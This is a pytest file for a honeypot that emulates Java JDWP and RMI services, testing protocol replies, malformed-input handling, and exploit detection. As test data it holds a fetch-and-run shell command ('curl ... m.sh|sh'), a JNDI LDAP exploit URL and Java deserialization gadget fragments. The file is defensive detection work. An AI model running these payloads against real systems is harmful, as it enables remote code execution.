"""Tests for the JDWP (TCP/8000) and Java RMI registry (TCP/1099) handlers."""

import asyncio
import logging
import struct

import pytest

from honeyknot.config import ServiceConfig
from honeyknot.protocols.base import ConnectionContext
from honeyknot.protocols.jdwp import HANDSHAKE, JDWPHandler
from honeyknot.protocols.rmi import RMIHandler

SER_MAGIC = b"\xac\xed\x00\x05"


class _FakeWriter:
    def __init__(self):
        self.buffer = bytearray()
        self._closing = False

    def is_closing(self):
        return self._closing

    def write(self, data: bytes):
        self.buffer.extend(data)

    async def drain(self):
        return None

    def close(self):
        self._closing = True

    async def wait_closed(self):
        return None


# server.py's _emit_protocol forwards handler fields into EventSink.emit,
# which already sets these itself. A handler field with one of these keys is a
# duplicate-keyword TypeError in production, so the fake sink rejects them too.
RESERVED_FIELDS = {"event", "name", "transport", "port", "protocol", "peer"}


class _Events:
    """Collects (name, fields) pairs emitted through ctx.event."""

    def __init__(self):
        self.records: list[tuple[str, dict]] = []

    def __call__(self, name, **fields):
        clashes = RESERVED_FIELDS & set(fields)
        assert not clashes, f"event {name!r} uses reserved field(s) {sorted(clashes)}"
        self.records.append((name, fields))

    def names(self) -> list[str]:
        return [n for n, _ in self.records]

    def get(self, name: str) -> dict:
        for n, fields in self.records:
            if n == name:
                return fields
        raise AssertionError(f"event {name!r} not emitted; got {self.names()}")


def _ctx(port: int = 0):
    writer = _FakeWriter()
    events = _Events()
    ctx = ConnectionContext(
        writer=writer, addr=("203.0.113.9", 51234), port=port,
        request_logger=logging.getLogger("test.req"), raw_capture=None,
        emit_event=events,
    )
    return ctx, writer, events


def _cfg(protocol: str, **opts) -> ServiceConfig:
    return ServiceConfig(port=0, service_type="tcp", protocol=protocol,
                         protocol_opts=opts)


def _run(coro):
    return asyncio.run(coro)


def _jdwp_cmd(packet_id: int, command_set: int, command: int, data: bytes = b"") -> bytes:
    return (struct.pack(">IIBBB", 11 + len(data), packet_id, 0, command_set, command)
            + data)


def _jdwp_string(value: bytes) -> bytes:
    return struct.pack(">I", len(value)) + value


def _parse_reply(buf: bytes) -> tuple[int, int, int, int, bytes]:
    """length, id, flags, error, payload."""
    length, reply_id, flags, error = struct.unpack(">IIBH", buf[:11])
    return length, reply_id, flags, error, buf[11:length]


class TestJDWPHandshake:
    def test_handshake_echoed_and_event(self):
        ctx, writer, events = _ctx()
        handler = JDWPHandler(_cfg("jdwp"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(HANDSHAKE, ctx))
        assert bytes(writer.buffer) == HANDSHAKE
        assert bytes(writer.buffer) == b"JDWP-Handshake"
        assert "jdwp_handshake" in events.names()
        assert not ctx.closed

    def test_handshake_split_across_chunks(self):
        ctx, writer, events = _ctx()
        handler = JDWPHandler(_cfg("jdwp"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(HANDSHAKE[:6], ctx))
        assert bytes(writer.buffer) == b""
        assert not ctx.closed
        _run(handler.on_data(HANDSHAKE[6:], ctx))
        assert bytes(writer.buffer) == HANDSHAKE
        assert "jdwp_handshake" in events.names()

    def test_handshake_and_command_in_one_chunk(self):
        ctx, writer, _ = _ctx()
        handler = JDWPHandler(_cfg("jdwp"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(HANDSHAKE + _jdwp_cmd(1, 1, 1), ctx))
        assert bytes(writer.buffer[:14]) == HANDSHAKE
        assert len(writer.buffer) > 14  # the Version reply followed

    def test_non_handshake_opener_closes(self):
        ctx, writer, _ = _ctx()
        handler = JDWPHandler(_cfg("jdwp"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"GET / HTTP/1.1\r\n\r\n", ctx))
        assert ctx.closed
        assert bytes(writer.buffer) == b""


class TestJDWPCommands:
    @staticmethod
    def _handshaken():
        ctx, writer, events = _ctx()
        handler = JDWPHandler(_cfg("jdwp", vm_version="1.8.0_181",
                                   vm_name="OpenJDK 64-Bit Server VM"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(HANDSHAKE, ctx))
        writer.buffer.clear()
        events.records.clear()
        return handler, ctx, writer, events

    def test_version_reply_is_well_formed(self):
        handler, ctx, writer, events = self._handshaken()
        _run(handler.on_data(_jdwp_cmd(0x2A, 1, 1), ctx))
        raw = bytes(writer.buffer)
        length, reply_id, flags, error, payload = _parse_reply(raw)
        assert length == len(raw)          # declared length matches the wire
        assert reply_id == 0x2A            # id echoed
        assert flags == 0x80               # REPLY
        assert error == 0
        # description string, jdwpMajor=1, jdwpMinor=8, vmVersion, vmName
        dlen = struct.unpack(">I", payload[:4])[0]
        rest = payload[4 + dlen:]
        assert struct.unpack(">II", rest[:8]) == (1, 8)
        assert b"1.8.0_181" in payload
        assert b"OpenJDK 64-Bit Server VM" in payload
        cmd = events.get("jdwp_command")
        assert cmd["command_name"] == "VirtualMachine.Version"
        assert cmd["id"] == 0x2A

    def test_version_strings_configurable(self):
        ctx, writer, _ = _ctx()
        handler = JDWPHandler(_cfg("jdwp", vm_version="11.0.2",
                                   vm_name="Zulu 11 VM"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(HANDSHAKE + _jdwp_cmd(1, 1, 1), ctx))
        assert b"11.0.2" in writer.buffer
        assert b"Zulu 11 VM" in writer.buffer

    def test_idsizes_returns_five_eights(self):
        handler, ctx, writer, _ = self._handshaken()
        _run(handler.on_data(_jdwp_cmd(7, 1, 7), ctx))
        length, reply_id, flags, error, payload = _parse_reply(bytes(writer.buffer))
        assert (reply_id, flags, error) == (7, 0x80, 0)
        assert len(payload) == 20
        assert struct.unpack(">IIIII", payload) == (8, 8, 8, 8, 8)

    def test_classes_by_signature_claims_runtime_exists(self):
        handler, ctx, writer, events = self._handshaken()
        sig = b"Ljava/lang/Runtime;"
        _run(handler.on_data(_jdwp_cmd(9, 1, 2, _jdwp_string(sig)), ctx))
        lookup = events.get("jdwp_class_lookup")
        assert lookup["signature"] == "Ljava/lang/Runtime;"
        _, reply_id, flags, error, payload = _parse_reply(bytes(writer.buffer))
        assert (reply_id, flags, error) == (9, 0x80, 0)
        classes, ref_tag, type_id, status = struct.unpack(">IBQI", payload)
        assert classes == 1          # the class "exists"
        assert ref_tag == 1          # CLASS
        assert type_id != 0
        assert status == 7           # verified | prepared | initialized

    def test_truncated_signature_does_not_raise(self):
        handler, ctx, _, events = self._handshaken()
        # declares a 200-byte string but supplies 4
        _run(handler.on_data(_jdwp_cmd(9, 1, 2, struct.pack(">I", 200) + b"Ljav"), ctx))
        assert events.get("jdwp_class_lookup")["signature"] == ""

    def test_capabilities_all_true(self):
        handler, ctx, writer, _ = self._handshaken()
        _run(handler.on_data(_jdwp_cmd(1, 1, 17), ctx))
        _, _, _, _, payload = _parse_reply(bytes(writer.buffer))
        assert payload == b"\x01" * 7
        writer.buffer.clear()
        _run(handler.on_data(_jdwp_cmd(2, 1, 29), ctx))
        _, _, _, _, payload = _parse_reply(bytes(writer.buffer))
        assert payload == b"\x01" * 32

    def test_all_classes_and_threads_empty(self):
        handler, ctx, writer, _ = self._handshaken()
        for cmd in (3, 4):
            writer.buffer.clear()
            _run(handler.on_data(_jdwp_cmd(cmd, 1, cmd), ctx))
            _, _, _, _, payload = _parse_reply(bytes(writer.buffer))
            assert struct.unpack(">I", payload)[0] == 0

    def test_unknown_command_gets_empty_ok_reply(self):
        handler, ctx, writer, events = self._handshaken()
        _run(handler.on_data(_jdwp_cmd(5, 11, 7, b"\x00" * 8), ctx))
        length, reply_id, flags, error, payload = _parse_reply(bytes(writer.buffer))
        assert (length, reply_id, flags, error, payload) == (11, 5, 0x80, 0, b"")
        assert events.get("jdwp_command")["command_name"] == "ThreadReference.cmd7"
        assert not ctx.closed

    def test_event_request_set(self):
        handler, ctx, writer, events = self._handshaken()
        # eventKind=2 (BREAKPOINT), suspendPolicy=2 (ALL), then modifiers
        data = bytes([2, 2]) + struct.pack(">I", 1) + b"\x07" + b"\x00" * 16
        _run(handler.on_data(_jdwp_cmd(11, 15, 1, data), ctx))
        req = events.get("jdwp_event_request")
        assert req["event_kind"] == 2
        assert req["suspend_policy"] == 2
        assert req["data_bytes"] == len(data)
        _, _, _, _, payload = _parse_reply(bytes(writer.buffer))
        assert struct.unpack(">I", payload)[0] == 1  # requestID
        assert events.get("jdwp_command")["command_name"] == "EventRequest.Set"

    def test_empty_event_request_does_not_raise(self):
        handler, ctx, _, events = self._handshaken()
        _run(handler.on_data(_jdwp_cmd(11, 15, 1, b""), ctx))
        assert events.get("jdwp_event_request")["event_kind"] == 0


class TestJDWPInvoke:
    @staticmethod
    def _invoke(command_set: int, command: int):
        ctx, writer, events = _ctx()
        handler = JDWPHandler(_cfg("jdwp"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(HANDSHAKE, ctx))
        writer.buffer.clear()
        events.records.clear()
        payload = (b"\x00" * 8 + b"\x00\x00\x00\x01"
                   + b"\x73" + struct.pack(">I", 22)
                   + b"/bin/sh -c curl http://198.51.100.7/m.sh|sh"
                   + b"\x00\x00\x00\x00")
        _run(handler.on_data(_jdwp_cmd(99, command_set, command, payload), ctx))
        return ctx, writer, events

    def test_object_reference_invoke_method(self):
        ctx, writer, events = self._invoke(9, 6)
        invoke = events.get("jdwp_invoke")
        assert invoke["command_set"] == 9
        assert invoke["command"] == 6
        assert invoke["data_bytes"] > 0
        assert any("/bin/sh -c curl http://198.51.100.7/m.sh|sh" in s
                   for s in invoke["strings"])
        exploit = events.get("exploit_attempt")
        # Same shape as the capture pipeline's exploit_attempt, so one
        # query finds regex hits and handler-recognized ones alike.
        assert exploit["exploit_ids"] == ["jdwp-rce"]
        assert exploit["severity"] == "critical"
        assert exploit["hits"][0]["category"] == "rce"
        assert exploit["hits"][0]["title"].startswith("JDWP invokeMethod")
        # Still a well-formed empty reply so the client doesn't bail.
        length, reply_id, flags, error, payload = _parse_reply(bytes(writer.buffer))
        assert (length, reply_id, flags, error, payload) == (11, 99, 0x80, 0, b"")
        assert not ctx.closed

    def test_class_type_invoke_method(self):
        _, _, events = self._invoke(3, 3)
        assert events.get("jdwp_invoke")["command_set"] == 3
        assert events.get("exploit_attempt")["exploit_ids"] == ["jdwp-rce"]
        assert events.get("jdwp_command")["command_name"] == "ClassType.InvokeMethod"

    def test_strings_are_capped(self):
        ctx, writer, events = _ctx()
        handler = JDWPHandler(_cfg("jdwp"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(HANDSHAKE, ctx))
        blob = b"\x00".join(b"A" * 500 for _ in range(60))
        _run(handler.on_data(_jdwp_cmd(1, 9, 6, blob), ctx))
        strings = events.get("jdwp_invoke")["strings"]
        assert len(strings) <= 20
        assert all(len(s) <= 200 for s in strings)


class TestJDWPGuards:
    @staticmethod
    def _handshaken():
        ctx, writer, events = _ctx()
        handler = JDWPHandler(_cfg("jdwp"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(HANDSHAKE, ctx))
        writer.buffer.clear()
        events.records.clear()
        return handler, ctx, writer, events

    def test_bogus_short_length_closes_without_raising(self):
        handler, ctx, writer, _ = self._handshaken()
        _run(handler.on_data(struct.pack(">IIBBB", 3, 1, 0, 1, 1), ctx))
        assert ctx.closed
        assert bytes(writer.buffer) == b""

    def test_absurd_length_closes_without_raising(self):
        handler, ctx, _, _ = self._handshaken()
        _run(handler.on_data(struct.pack(">IIBBB", 0xFFFFFFFF, 1, 0, 1, 1), ctx))
        assert ctx.closed

    def test_partial_packet_waits(self):
        handler, ctx, writer, _ = self._handshaken()
        packet = _jdwp_cmd(5, 1, 1)
        _run(handler.on_data(packet[:7], ctx))
        assert bytes(writer.buffer) == b""
        assert not ctx.closed
        _run(handler.on_data(packet[7:], ctx))
        assert len(writer.buffer) > 11

    def test_reply_packet_from_client_is_ignored(self):
        handler, ctx, writer, events = self._handshaken()
        _run(handler.on_data(struct.pack(">IIBH", 11, 4, 0x80, 0), ctx))
        assert bytes(writer.buffer) == b""
        assert "jdwp_command" not in events.names()
        assert not ctx.closed

    def test_random_binary_after_handshake_does_not_raise(self):
        handler, ctx, _, _ = self._handshaken()
        _run(handler.on_data(bytes(range(256)) * 4, ctx))  # must not raise


# --------------------------------------------------------------------------
# RMI
# --------------------------------------------------------------------------

def _jrmi(protocol: int = 0x4B, version: int = 2) -> bytes:
    return b"JRMI" + struct.pack(">HB", version, protocol)


class TestRMIHandshake:
    def test_stream_protocol_gets_ack(self):
        ctx, writer, events = _ctx()
        handler = RMIHandler(_cfg("rmi"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(_jrmi(0x4B), ctx))
        assert writer.buffer[0] == 0x4E  # ProtocolAck
        host_len = struct.unpack(">H", writer.buffer[1:3])[0]
        assert bytes(writer.buffer[3:3 + host_len]) == b"203.0.113.9"
        port = struct.unpack(">I", writer.buffer[3 + host_len:7 + host_len])[0]
        assert port == 0
        conn = events.get("rmi_connect")
        assert conn["jrmp_protocol"] == "0x4b"
        assert conn["protocol_name"] == "StreamProtocol"
        assert not ctx.closed

    def test_single_op_protocol_gets_no_ack(self):
        ctx, writer, events = _ctx()
        handler = RMIHandler(_cfg("rmi"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(_jrmi(0x4C), ctx))
        assert bytes(writer.buffer) == b""
        assert events.get("rmi_connect")["protocol_name"] == "SingleOpProtocol"

    def test_multiplex_protocol_gets_ack(self):
        ctx, writer, events = _ctx()
        handler = RMIHandler(_cfg("rmi"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(_jrmi(0x4D), ctx))
        assert writer.buffer[0] == 0x4E
        assert events.get("rmi_connect")["protocol_name"] == "MultiplexProtocol"

    def test_bad_magic_closes(self):
        ctx, writer, _ = _ctx()
        handler = RMIHandler(_cfg("rmi"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"GET / HTTP/1.1\r\n\r\n", ctx))
        assert ctx.closed
        assert bytes(writer.buffer) == b""

    def test_truncated_header_does_not_raise(self):
        ctx, writer, events = _ctx()
        handler = RMIHandler(_cfg("rmi"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"JRM", ctx))
        assert bytes(writer.buffer) == b""
        assert not ctx.closed
        assert events.names() == []
        _run(handler.on_data(b"I\x00\x02\x4b", ctx))  # rest of the header
        assert writer.buffer[0] == 0x4E

    def test_silent_client_does_not_raise(self):
        ctx, _, _ = _ctx()
        handler = RMIHandler(_cfg("rmi"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(b"", ctx))
        assert not ctx.closed

    def test_client_endpoint_identifier_is_consumed(self):
        ctx, writer, events = _ctx()
        handler = RMIHandler(_cfg("rmi"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(_jrmi(0x4B), ctx))
        writer.buffer.clear()
        endpoint = struct.pack(">H", 9) + b"127.0.0.1" + struct.pack(">I", 0)
        _run(handler.on_data(endpoint + b"\x52", ctx))  # endpoint then a Ping
        assert bytes(writer.buffer) == b"\x53"  # PingAck
        assert events.get("rmi_message")["type_name"] == "Ping"


class TestRMIMessages:
    @staticmethod
    def _connected():
        ctx, writer, events = _ctx()
        handler = RMIHandler(_cfg("rmi"))
        _run(handler.on_connect(ctx))
        _run(handler.on_data(_jrmi(0x4B), ctx))
        writer.buffer.clear()
        events.records.clear()
        return handler, ctx, writer, events

    def test_ping_is_answered(self):
        handler, ctx, writer, events = self._connected()
        _run(handler.on_data(b"\x52", ctx))
        assert bytes(writer.buffer) == b"\x53"  # PingAck
        msg = events.get("rmi_message")
        assert msg["type"] == "0x52"
        assert msg["type_name"] == "Ping"
        assert not ctx.closed

    def test_call_with_gadget_chain(self):
        handler, ctx, writer, events = self._connected()
        body = (SER_MAGIC + b"\x77\x22\x00\x00"
                + b"\x73\x72\x00\x32"
                + b"org.apache.commons.collections.functors.InvokerTransformer"
                + b"\x87\xe8\xff\x81\xd8\x9d" + b"\x00" * 8)
        _run(handler.on_data(b"\x50" + body, ctx))
        msg = events.get("rmi_message")
        assert msg["type"] == "0x50"
        assert msg["type_name"] == "Call"
        assert msg["bytes"] == len(body)
        ser = events.get("java_serialized")
        assert ser["offset"] == 0
        assert any("InvokerTransformer" in s for s in ser["strings"])
        exploit = events.get("exploit_attempt")
        assert exploit["exploit_ids"] == ["java-deserialization"]
        assert exploit["severity"] == "critical"
        assert exploit["hits"][0]["category"] == "deserialization"
        assert "InvokerTransformer" in exploit["indicators"]
        # We answered so the client keeps the socket open.
        assert writer.buffer[0] == 0x51
        assert not ctx.closed

    def test_call_with_jndi_url(self):
        handler, ctx, _, events = self._connected()
        payload = b"\x00\x10" + b"ldap://198.51.100.4:389/Exploit" + b"\x00\x00"
        _run(handler.on_data(b"\x50" + b"\x00" * 6 + SER_MAGIC + payload, ctx))
        assert events.get("java_serialized")["offset"] == 6
        assert events.get("exploit_attempt")["indicators"] == ["ldap://"]

    def test_call_without_serialized_magic_is_quiet(self):
        handler, ctx, _, events = self._connected()
        _run(handler.on_data(b"\x50" + b"\x00" * 32, ctx))
        assert events.get("rmi_message")["type_name"] == "Call"
        assert "java_serialized" not in events.names()
        assert "exploit_attempt" not in events.names()

    def test_serialized_strings_are_capped(self):
        handler, ctx, _, events = self._connected()
        blob = SER_MAGIC + b"\x00".join(b"B" * 400 for _ in range(60))
        _run(handler.on_data(b"\x50" + blob, ctx))
        strings = events.get("java_serialized")["strings"]
        assert len(strings) <= 20
        assert all(len(s) <= 120 for s in strings)

    def test_call_split_across_chunks_still_scans(self):
        handler, ctx, _, events = self._connected()
        _run(handler.on_data(b"\x50" + b"\x00" * 4, ctx))
        events.records.clear()
        _run(handler.on_data(SER_MAGIC + b"\x00\x2b"
                             + b"sun.reflect.annotation."
                               b"AnnotationInvocationHandler", ctx))
        assert events.get("java_serialized")["offset"] == 0
        assert events.get("exploit_attempt")["indicators"] == [
            "AnnotationInvocationHandler"]

    def test_dgc_ack_and_unknown_bytes_do_not_raise(self):
        handler, ctx, _, events = self._connected()
        _run(handler.on_data(b"\x54" + b"\x00" * 14, ctx))
        assert events.get("rmi_message")["type_name"] == "DgcAck"
        _run(handler.on_data(b"\xff\xee\xdd garbage", ctx))
        assert not ctx.closed

    def test_oversized_stream_is_dropped(self):
        handler, ctx, _, _ = self._connected()
        # No message type byte, so it accumulates until the cap trips.
        _run(handler.on_data(b"\x00" * ((1 << 20) + 16), ctx))
        assert ctx.closed


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
